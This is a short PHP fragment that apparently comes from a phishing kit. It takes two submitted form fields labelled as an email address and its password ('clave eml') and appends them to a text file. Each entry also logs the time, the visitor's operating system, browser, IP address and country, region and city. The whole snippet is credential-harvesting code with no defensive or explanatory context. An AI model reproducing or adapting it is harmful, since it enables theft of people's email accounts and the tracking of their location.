...
if( isset ($_POST['campo1']) && isset ($_POST['campo2']) ){
	...
	$file = fopen("dt10.txt", "a");
fwrite($file, "eml : " .$_POST['campo1']." - clave eml : " .$_POST['campo2']." - ".date ('l jS \of F Y h:i:s A',time()). "".$user_os." ".$navegador." ".$userp." ".$pais.", ".$region.", ".$ciudad  .PHP_EOL);
fwrite($file, "======================" . PHP_EOL);
